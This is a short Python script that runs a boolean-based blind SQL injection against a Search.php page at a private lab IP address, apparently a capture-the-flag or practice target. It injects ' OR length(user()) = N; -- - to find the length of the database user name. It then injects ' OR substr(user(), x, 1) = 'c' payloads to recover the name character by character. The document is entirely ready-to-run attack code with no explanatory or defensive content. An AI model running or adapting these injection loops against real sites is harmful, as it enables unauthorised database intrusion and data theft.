import requests

gettingLength = True
length = 0

#Getting the length of the username.
while gettingLength:
    lengthInjection = "http://192.168.56.101/Search.php?Search=\' OR length(user()) = " + str(length) + "; -- -"

    r = requests.get(lengthInjection)

    if "Nice_Going!" in r.text:
        gettingLength = False
    else:
        length = length + 1

    if length == 100:
        gettingLength = False

username = ""
characters = [ 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '_', '@', '{', '}']
#Getting the username by iterating through the possible characters and using the SQL substr() function.
#If the value is in the username at the location given, then it returns a successful injection.
for x in range(1, (length + 1)):
    for y in characters:
        usernameInjection = "http://192.168.56.101/Search.php?Search=\' OR substr(user(), " + str(x) + ", 1) = \'" + str(y) + "\'; -- -"
        r = requests.get(usernameInjection)
        if "Nice_Going!" in r.text:
            username = username + str(y)
            break

print username
